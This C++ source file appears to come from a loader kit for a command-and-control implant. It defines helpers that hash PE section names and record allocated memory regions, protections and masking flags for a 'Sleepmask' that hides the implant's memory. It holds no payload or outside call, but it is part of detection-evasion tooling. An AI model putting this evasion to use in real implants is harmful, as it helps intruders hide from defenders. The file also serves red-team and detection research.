#include "StdLib.h"
#include "Hash.h"
#include "TrackMemory.h"

/*******************************************************************
 * To avoid problems with function positioning, do not add any new
 * functions above this pragma directive.
********************************************************************/
#pragma code_seg(".text$g")

constexpr DWORD textHash = CompileTimeHash(".text");
constexpr DWORD rdataHash = CompileTimeHash(".rdata");
constexpr DWORD dataHash = CompileTimeHash(".data");
constexpr DWORD pdataHash = CompileTimeHash(".pdata");
constexpr DWORD relocHash = CompileTimeHash(".reloc");

/**
* Identify known PE sections based on their name
* 
* @param sectionName The section's name
* @return The section number
*/
ALLOCATED_MEMORY_LABEL GetSectionLabelFromName(const PBYTE sectionName) {
    DWORD sectionNameHash = RunTimeHash((LPCSTR) sectionName);

    switch (sectionNameHash) {
        case textHash:  return LABEL_TEXT;
        case rdataHash: return LABEL_RDATA;
        case dataHash:  return LABEL_DATA;
        case pdataHash: return LABEL_PDATA;
        case relocHash: return LABEL_RELOC;
        default:        return LABEL_EMPTY;
    }
}

/**
 * Track an allocated memory region
 * 
 * Note: This function tracks an initial allocation to facilitate cleanup.
 * To use the Sleepmask, individual section information must be provided
 * by TrackAllocatedMemorySection.
 *
 * @param allocatedMemoryRegion A pointer to the MEMORY_INFORMATION_REGION structure
 * @param purpose An enum to define the purpose of the memory allocation (i.e BEACON|SLEEPMASK|BOF|BUFFER)
 * @param allocationBase A pointer to the allocation base
 * @param size The size of the allocated memory
 * @param memoryType The type of pages in the region (MEM_IMAGE | MEM_MAPPED | MEM_PRIVATE)
 * @param memoryCleanupInformation A pointer to an ALLOCATED_MEMORY_CLEANUP_INFORMATION structure
*/
void TrackAllocatedMemoryRegion(PALLOCATED_MEMORY_REGION allocatedMemoryRegion, ALLOCATED_MEMORY_PURPOSE purpose, PVOID allocationBase, SIZE_T size, DWORD memoryType, PALLOCATED_MEMORY_CLEANUP_INFORMATION memoryCleanupInformation) {
   PRINT("\t[+] Capture Allocated Memory Block - Purpose: %lu BaseAddress: %p Size: %lu \n", purpose, allocationBase, size);
   allocatedMemoryRegion->Purpose = purpose;
   allocatedMemoryRegion->AllocationBase = allocationBase;
   allocatedMemoryRegion->RegionSize = size;
   allocatedMemoryRegion->Type = memoryType;

   if (memoryCleanupInformation != NULL) {
       allocatedMemoryRegion->CleanupInformation = *memoryCleanupInformation;
   }
   else {
       allocatedMemoryRegion->CleanupInformation.AllocationMethod = ALLOCATED_MEMORY_ALLOCATION_METHOD::METHOD_UNKNOWN;
   }

   return;
}

/**
 * Track a section within a specified memory region
 * 
 * Note: This function can be used to track individual sections
 * within a region of allocated memory. This information is required 
 * by the Sleepmask.
 *
 * @param allocatedMemorySection A pointer to the ALLOCATED_MEMORY_SECTION structure
 * @param label The section label
 * @param baseAddress A pointer to the baseAddress of the section
 * @param virtualSize The virtual size of the section
 * @param memoryProtections The protections of the memory allocation
 * @param mask An enum to indicate whether sections should be masked
*/
void TrackAllocatedMemorySection(PALLOCATED_MEMORY_SECTION allocatedMemorySection, ALLOCATED_MEMORY_LABEL label, PVOID baseAddress, SIZE_T virtualSize, DWORD memoryProtections, ALLOCATED_MEMORY_MASK_MEMORY_BOOL mask) {
    PRINT("\t[+] Capture Allocated Section - Section: %lu BaseAddress: %p Size: %lu Mask: %i \n", label, baseAddress, virtualSize, mask);
    allocatedMemorySection->Label = label;
    allocatedMemorySection->BaseAddress = baseAddress;
    allocatedMemorySection->VirtualSize = virtualSize;
    allocatedMemorySection->CurrentProtect = memoryProtections;
    allocatedMemorySection->PreviousProtect = memoryProtections;
    allocatedMemorySection->MaskSection = mask;

    return;
}

/**
 * Track a generic buffer
 * 
 * Note: This function tracks the initial memory allocation and stores 
 * the information required by the Sleepmask in the first ALLOCATED_MEMORY_STRUCTURE 
 * entry. This is intended for generic buffers that are not split into individual 
 * sections.
 *
 * @param allocatedMemoryRegion A pointer to the MEMORY_INFORMATION_REGION structure
 * @param purpose An enum to define the purpose of the memory allocation (i.e PURPOSE_BEACON_MEMORY etc)
 * @param baseAddress A pointer to the allocation base
 * @param size The size of the buffer
 * @param memoryType The type of pages in the region (MEM_IMAGE | MEM_MAPPED | MEM_PRIVATE)
 * @param memoryProtections The protections of the memory allocation
 * @param memoryCleanupInformation A pointer to an ALLOCATED_MEMORY_CLEANUP_INFORMATION structure
 * @param mask An enum to indicate whether the buffer should be masked
*/
void TrackAllocatedMemoryBuffer(PALLOCATED_MEMORY_REGION allocatedMemoryRegion, ALLOCATED_MEMORY_PURPOSE purpose, PVOID baseAddress, SIZE_T size, DWORD memoryType, DWORD memoryProtections, PALLOCATED_MEMORY_CLEANUP_INFORMATION memoryCleanupInformation, ALLOCATED_MEMORY_MASK_MEMORY_BOOL mask) {
    TrackAllocatedMemoryRegion(allocatedMemoryRegion, purpose, baseAddress, size, memoryType, memoryCleanupInformation);
    TrackAllocatedMemorySection(&allocatedMemoryRegion->Sections[0], ALLOCATED_MEMORY_LABEL::LABEL_BUFFER, baseAddress, size, memoryProtections, mask);
    
    return;
}
